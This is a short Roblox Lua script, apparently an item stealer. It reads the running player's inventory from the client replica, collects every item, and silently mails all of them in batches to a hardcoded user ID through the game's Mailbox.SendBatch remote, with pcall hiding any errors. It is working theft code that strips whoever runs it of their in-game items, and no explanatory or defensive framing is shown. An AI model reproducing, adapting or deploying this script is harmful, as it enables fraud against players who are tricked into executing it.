local Networking = require(game.ReplicatedStorage.SharedModules.Networking) local PlayerStateClient = require(game.ReplicatedStorage.ClientModules.PlayerStateClient) local TARGET_USERID = 10703701792 local replica = PlayerStateClient:GetLocalReplica() if not replica or not replica.Data or not replica.Data.Inventory then return end local inventory = replica.Data.Inventory local items = {} for category, contents in pairs(inventory) do if type(contents) == "table" then for itemKey, value in pairs(contents) do if type(value) == "number" and value > 0 then table.insert(items, { Category = category, ItemKey = itemKey, Count = value }) elseif type(value) == "table" and value.Id then table.insert(items, { Category = category, ItemKey = itemKey, Count = 1 }) end end end end if #items == 0 then return end local BATCH_SIZE = 1000 for i = 1, #items, BATCH_SIZE do local batch = {} for j = i, math.min(i + BATCH_SIZE - 1, #items) do table.insert(batch, items[j]) end pcall(function() Networking.Mailbox.SendBatch:Fire(TARGET_USERID, batch, "") end) task.wait(0) end